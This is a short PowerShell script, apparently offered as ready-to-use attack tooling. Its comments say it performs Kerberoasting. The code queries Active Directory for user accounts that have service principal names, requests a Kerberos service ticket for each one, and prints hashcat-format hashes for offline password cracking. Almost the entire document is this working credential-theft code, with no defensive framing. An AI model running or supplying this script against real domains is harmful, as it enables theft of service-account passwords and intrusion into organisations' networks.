# Goal of script is to perform a Kerberoasting attack and enumerate SPNs. Goal is to capture these SPNs to identify Windows service accounts and extract the password hashes.
# The script below involves Active Directory being queried to request the username and SPN associated with accounts that have an SPN set. The $TicketHexStream variable is storing the hexadecimal value of the Kerberos service ticket, which is then processed to extract a hash that can be used for offline password cracking.
$Null = [Reflection.Assembly]::LoadWithPartialName( 'System.IdentityModel' ); $search  = New-Object DirectoryServices.DirectorySearcher( [ADSI]'' ); $search.filter =  '(&(servicePrincipalName=*)(objectCategory=user))'; $results = $search.Findall();  foreach ( $results in $results ) { $u = $results.GetDirectoryEntry(); $samAccountName =  $u.samAccountName; foreach ( $s in $u.servicePrincipalName ) { $Ticket = $null; try { $Ticket  = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $s;  } catch [System.Management.Automation.MethodInvocationException] {} if ( $Ticket -ne $null  ) { $TicketByteStream = $Ticket.GetRequest(); if ( $TicketByteStream ) { $TicketHexStream  = [System.BitConverter]::ToString( $TicketByteStream ) -replace '-'; [System.Collections. ArrayList]$Parts = ( $TicketHexStream -replace '^(.*?)04820...(.*)', '$2' ) -Split 'A48201';  $Parts.RemoveAt( $Parts.Count - 1 ); $Hash = $Parts -join 'A48201'; try { $Hash = $Hash.Insert(  32, '$' ); $HashFormat = '$krb5tgs$23$*' + $samAccountName + '/' + $s + '*$' + $Hash; Write-Host  $HashFormat; break; } catch [System.Management.Automation.MethodInvocationException] {} } } } } 
